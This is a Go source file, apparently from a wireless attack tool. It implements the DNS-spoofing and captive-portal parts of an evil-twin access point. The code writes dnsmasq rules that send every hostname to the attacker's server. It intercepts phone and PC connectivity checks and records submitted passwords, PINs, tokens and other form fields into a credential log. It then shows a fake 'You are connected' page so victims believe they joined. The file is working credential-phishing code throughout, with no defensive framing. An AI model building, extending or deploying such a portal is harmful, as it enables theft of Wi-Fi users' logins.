package wifi

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

// DNSRule redirects one hostname (or "*" for every name) to a local address.
// It is rendered into dnsmasq.conf as an `address=` entry, so clients asking
// for that URL are sent to the chosen server instead.
type DNSRule struct {
	Host string `json:"host"`
	IP   string `json:"ip"`
}

// ParseDNSRule accepts "host=ip", "host ip" or just "ip" (which means every
// hostname), and validates the address.
func ParseDNSRule(raw string) (DNSRule, error) {
	s := strings.TrimSpace(raw)
	if s == "" {
		return DNSRule{}, fmt.Errorf("empty rule")
	}
	host := "*"
	ip := s
	if i := strings.IndexAny(s, "= "); i > 0 {
		host = strings.TrimSpace(s[:i])
		ip = strings.TrimSpace(s[i+1:])
	}
	if host == "" {
		host = "*"
	}
	ip = strings.TrimPrefix(ip, "/")
	if parsed := net.ParseIP(ip); parsed == nil || parsed.To4() == nil {
		return DNSRule{}, fmt.Errorf("invalid IPv4 %q", ip)
	}
	if strings.ContainsAny(host, " /") {
		return DNSRule{}, fmt.Errorf("invalid host %q", host)
	}
	return DNSRule{Host: strings.ToLower(host), IP: ip}, nil
}

// ParseDNSRules splits a comma/space separated rule list.
func ParseDNSRules(raw string) []DNSRule {
	var out []DNSRule
	for _, part := range strings.FieldsFunc(raw, func(r rune) bool {
		return r == ',' || r == ';' || r == '\n'
	}) {
		if rule, err := ParseDNSRule(part); err == nil {
			out = append(out, rule)
		}
	}
	return out
}

// FormatDNSRule renders a rule for the UI ("example.com → 192.168.66.1").
func FormatDNSRule(r DNSRule) string {
	host := r.Host
	if host == "*" || host == "" {
		host = "all"
	}
	return host + " → " + r.IP
}

// DNSSection renders the dnsmasq address= lines for a rule set. A catch-all is
// always present (pointing at the gateway unless a "*" rule overrides it) so
// the captive portal still catches unknown names.
func DNSSection(gateway string, rules []DNSRule) []string {
	catchAll := gateway
	var specific []string
	seen := map[string]bool{}
	for _, r := range rules {
		host := strings.TrimSpace(r.Host)
		if host == "" || host == "*" {
			catchAll = r.IP
			continue
		}
		if seen[host] {
			continue
		}
		seen[host] = true
		specific = append(specific, fmt.Sprintf("address=/%s/%s", host, r.IP))
	}
	out := append([]string{}, specific...)
	out = append(out, fmt.Sprintf("address=/#/%s", catchAll))
	return out
}

// PortalMode selects what the captive portal serves.
type PortalMode string

const (
	PortalOff    PortalMode = "off"
	PortalLogin  PortalMode = "login"
	PortalCustom PortalMode = "custom"
)

// ParsePortalMode normalises a mode string.
func ParsePortalMode(raw string) PortalMode {
	switch strings.ToLower(strings.TrimSpace(raw)) {
	case "custom", "file", "html":
		return PortalCustom
	case "off", "none", "0", "no":
		return PortalOff
	default:
		return PortalLogin
	}
}

// PortalConfig describes the captive portal served by the evil twin.
type PortalConfig struct {
	Mode     PortalMode
	File     string // custom HTML, used when Mode == PortalCustom
	LogPath  string // NDJSON credential log
	OnEvent  func(string)
	Redirect string // optional URL to offer on the success page
}

// PortalCapture is one logged credential submission.
type PortalCapture struct {
	Time      string            `json:"time"`
	ClientIP  string            `json:"client_ip"`
	Method    string            `json:"method"`
	Path      string            `json:"path"`
	UserAgent string            `json:"user_agent,omitempty"`
	Target    string            `json:"target_url,omitempty"`
	Fields    map[string]string `json:"fields"`
}

// PortalSuccessPage is shown after a submission so the client thinks it joined.
const PortalSuccessPage = `<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>body{font-family:system-ui,sans-serif;background:#111;color:#eee;margin:0;
display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#1c1c1c;border:1px solid #333;border-radius:12px;padding:24px;max-width:22rem;width:90%}
h1{font-size:1.1rem;margin:0 0 .5rem}p{color:#9ca3af;font-size:.85rem;line-height:1.5}
</style></head><body><div class="card">
<h1>You are connected</h1>
<p>You can close this window and continue browsing.</p>
</div></body></html>`

// NewPortalHandler builds the HTTP handler for the captive portal. Every
// submission (POST body or query string) is appended to LogPath as one JSON
// line and reported through OnEvent, then the client is redirected to a
// success page.
func NewPortalHandler(cfg PortalConfig) http.Handler {
	page := PortalPage
	if cfg.Mode == PortalCustom && strings.TrimSpace(cfg.File) != "" {
		if data, err := os.ReadFile(cfg.File); err == nil && len(strings.TrimSpace(string(data))) > 0 {
			page = string(data)
		} else if cfg.OnEvent != nil {
			cfg.OnEvent(fmt.Sprintf("portal page %s unreadable: %v", cfg.File, err))
		}
	}
	var mu sync.Mutex

	logCapture := func(capture PortalCapture) {
		if capture.Fields == nil {
			return
		}
		mu.Lock()
		defer mu.Unlock()
		if strings.TrimSpace(cfg.LogPath) != "" {
			if err := os.MkdirAll(filepath.Dir(cfg.LogPath), 0o700); err == nil {
				if f, err := os.OpenFile(cfg.LogPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
					enc := json.NewEncoder(f)
					_ = enc.Encode(capture)
					_ = f.Close()
				}
			}
		}
		if cfg.OnEvent != nil {
			var keys []string
			for k := range capture.Fields {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			cfg.OnEvent(fmt.Sprintf("portal: %s from %s", strings.Join(keys, ","), capture.ClientIP))
		}
	}

	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/generate_204", "/gen_204", "/hotspot-detect.html", "/connecttest.txt",
			"/ncsi.txt", "/redirect", "/canonical.html", "/success.txt":
			w.Header().Set("Location", "/portal")
			w.WriteHeader(http.StatusFound)
			return
		}

		// Collect credentials from the form body or the query string.
		_ = r.ParseForm()
		fields := map[string]string{}
		for k, v := range r.PostForm {
			fields[k] = truncateField(strings.Join(v, ","), 200)
		}
		for k, v := range r.URL.Query() {
			if _, dup := fields[k]; dup {
				continue
			}
			fields[k] = truncateField(strings.Join(v, ","), 200)
		}
		target := fields["url"]
		if target == "" {
			target = fields["redirect"]
		}
		// POST bodies are always captured; GETs only when they look like a
		// submission (so ordinary captive-portal probes do not spam the log).
		if len(fields) > 0 && (r.Method != http.MethodGet || looksLikeCredential(fields)) {
			logCapture(PortalCapture{
				Time:      time.Now().Format(time.RFC3339),
				ClientIP:  clientIP(r),
				Method:    r.Method,
				Path:      r.URL.Path,
				UserAgent: truncateField(r.UserAgent(), 160),
				Target:    truncateField(target, 300),
				Fields:    fields,
			})
		}

		if r.Method == http.MethodPost {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.Header().Set("Cache-Control", "no-store")
			_, _ = w.Write([]byte(PortalSuccessPage))
			return
		}

		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write([]byte(page))
	})
}

// looksLikeCredential reports whether a query string looks like a form
// submission rather than a plain captive-portal probe.
func looksLikeCredential(fields map[string]string) bool {
	if len(fields) == 0 {
		return false
	}
	for k := range fields {
		lk := strings.ToLower(k)
		for _, needle := range []string{"pass", "pwd", "user", "email", "login", "pin", "token", "code"} {
			if strings.Contains(lk, needle) {
				return true
			}
		}
	}
	return len(fields) > 2
}

func truncateField(s string, max int) string {
	s = strings.TrimSpace(strings.ReplaceAll(strings.ReplaceAll(s, "\r", " "), "\n", " "))
	if len(s) > max {
		return s[:max]
	}
	return s
}

func clientIP(r *http.Request) string {
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		return host
	}
	return r.RemoteAddr
}
